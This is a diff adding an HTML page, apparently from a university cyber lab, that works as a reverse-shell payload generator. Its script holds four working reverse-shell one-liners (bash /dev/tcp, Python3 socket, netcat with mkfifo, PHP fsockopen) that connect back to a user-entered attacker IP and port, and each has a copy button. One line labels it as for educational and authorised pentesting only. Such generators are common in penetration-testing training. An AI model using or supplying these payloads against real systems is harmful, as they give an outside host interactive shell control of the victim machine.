@@ -1,0 +1,135 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>BladeSec - Payload Generator</title>
+    <!-- استدعاء Tailwind CSS للتصميم -->
+    <script src="https://cdn.tailwindcss.com"></script>
+    <!-- استدعاء خطوط المبرمجين -->
+    <link href="https://fonts.googleapis.com/css2?family=Fira+Code:wght@400;600&display=swap" rel="stylesheet">
+    <!-- استدعاء الأيقونات -->
+    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css">
+    
+    <script>
+        // إعدادات الألوان
+        tailwind.config = {
+            theme: {
+                extend: {
+                    fontFamily: { mono: ['"Fira Code"', 'monospace'] },
+                    colors: { panel: '#0a0a0a', primary: '#ef4444' }
+                }
+            }
+        }
+    </script>
+    <style>
+        body { background-color: #030712; color: #e5e7eb; }
+        .hacker-font { font-family: 'Fira Code', monospace; }
+        /* إخفاء شريط التمرير لجمالية الموقع */
+        ::-webkit-scrollbar { height: 6px; width: 6px; }
+        ::-webkit-scrollbar-thumb { background: #ef444440; border-radius: 10px; }
+    </style>
+</head>
+<body class="min-h-screen">
+
+    <!-- الشريط العلوي -->
+    <nav class="border-b border-red-900/30 bg-black p-4 flex justify-between items-center sticky top-0 z-50">
+        <div class="flex items-center gap-3">
+            <i class="fa-solid fa-shield-halved text-primary text-2xl"></i>
+            <h1 class="font-bold text-xl tracking-widest text-primary hacker-font">BLADE<span class="text-white">SEC</span></h1>
+        </div>
+        <div class="text-xs hacker-font text-gray-500 flex items-center gap-2">
+            <span class="w-2 h-2 rounded-full bg-primary animate-pulse"></span>
+            UOH Cyber Lab
+        </div>
+    </nav>
+
+    <!-- المحتوى الرئيسي -->
+    <main class="max-w-6xl mx-auto p-6 grid grid-cols-1 lg:grid-cols-12 gap-8 mt-8">
+        
+        <!-- القسم الأيسر: إعدادات الهدف -->
+        <div class="lg:col-span-4 space-y-6">
+            <div class="bg-panel border border-red-900/20 p-5 rounded-xl">
+                <h2 class="text-sm font-bold hacker-font text-red-400 mb-4"><i class="fa-solid fa-crosshairs"></i> TARGET CONFIG</h2>
+                <div class="space-y-4">
+                    <div>
+                        <label class="text-xs text-gray-500 hacker-font mb-1 block">LHOST (Your IP)</label>
+                        <input type="text" id="ip-input" value="10.10.10.10" oninput="updatePayloads()" class="w-full bg-black border border-red-900/30 rounded p-2 text-sm hacker-font text-white focus:outline-none focus:border-primary/50">
+                    </div>
+                    <div>
+                        <label class="text-xs text-gray-500 hacker-font mb-1 block">LPORT</label>
+                        <input type="text" id="port-input" value="4444" oninput="updatePayloads()" class="w-full bg-black border border-red-900/30 rounded p-2 text-sm hacker-font text-white focus:outline-none focus:border-primary/50">
+                    </div>
+                </div>
+            </div>
+            <div class="bg-red-500/5 border border-red-500/20 p-4 rounded-xl flex gap-3 items-start">
+                <i class="fa-solid fa-triangle-exclamation text-primary mt-1"></i>
+                <p class="text-xs text-red-200/70 leading-relaxed hacker-font">
+                    For educational and authorized Pentesting only.
+                </p>
+            </div>
+        </div>
+
+        <!-- القسم الأيمن: الأكواد المولدة -->
+        <div class="lg:col-span-8 space-y-4" id="payloads-container">
+            <!-- سيتم توليد الأكواد هنا بواسطة الجافاسكربت -->
+        </div>
+
+    </main>
+
+    <!-- الجافاسكربت المسؤولة عن تحديث الأكواد -->
+    <script>
+        const payloadsData = [
+            { id: "bash", name: "Bash Reverse Shell", desc: "Standard interactive bash reverse shell.", code: "bash -i >& /dev/tcp/{ip}/{port} 0>&1" },
+            { id: "python", name: "Python3 Reverse Shell", desc: "Python one-liner reverse shell.", code: "python3 -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((\"{ip}\",{port}));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call([\"/bin/sh\",\"-i\"]);'" },
+            { id: "nc", name: "Netcat OpenBSD", desc: "Netcat reverse shell without -e flag.", code: "rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc {ip} {port} >/tmp/f" },
+            { id: "php", name: "PHP Pentest Shell", desc: "Simple PHP web shell.", code: "php -r '$sock=fsockopen(\"{ip}\",{port});exec(\"/bin/sh -i <&3 >&3 2>&3\");'" }
+        ];
+
+        function updatePayloads() {
+            const ip = document.getElementById('ip-input').value || '10.10.10.10';
+            const port = document.getElementById('port-input').value || '4444';
+            const container = document.getElementById('payloads-container');
+            
+            container.innerHTML = ''; // مسح القديم
+
+            payloadsData.forEach(p => {
+                // استبدال الـ IP والـ Port داخل الكود
+                const finalCode = p.code.replace(/{ip}/g, ip).replace(/{port}/g, port);
+                
+                const card = `
+                <div class="bg-panel border border-gray-800/50 rounded-xl overflow-hidden hover:border-red-900/50 transition-colors">
+                    <div class="p-4 border-b border-gray-800/50 flex justify-between items-center">
+                        <div>
+                            <h3 class="font-bold text-gray-200 flex items-center gap-2 text-sm">
+                                <i class="fa-solid fa-terminal text-primary"></i> ${p.name}
+                            </h3>
+                            <p class="text-xs text-gray-500 mt-1">${p.desc}</p>
+                        </div>
+                    </div>
+                    <div class="bg-black p-4 relative group">
+                        <pre class="text-xs text-red-300 hacker-font overflow-x-auto pb-2" id="code-${p.id}">${finalCode}</pre>
+                        <button onclick="copyCode('${p.id}')" class="absolute right-3 top-3 p-2 bg-[#111] border border-gray-800 rounded hover:bg-gray-800 transition-colors text-gray-400" title="Copy">
+                            <i class="fa-solid fa-copy" id="icon-${p.id}"></i>
+                        </button>
+                    </div>
+                </div>`;
+                container.innerHTML += card;
+            });
+        }
+
+        function copyCode(id) {
+            const codeText = document.getElementById(`code-${id}`).innerText;
+            navigator.clipboard.writeText(codeText);
+            
+            // تغيير أيقونة النسخ كدليل على النجاح
+            const icon = document.getElementById(`icon-${id}`);
+            icon.className = "fa-solid fa-check text-green-500";
+            setTimeout(() => { icon.className = "fa-solid fa-copy"; }, 2000);
+        }
+
+        // تشغيل الدالة أول مرة تفتح فيها الصفحة
+        updatePayloads();
+    </script>
+</body>
+</html>
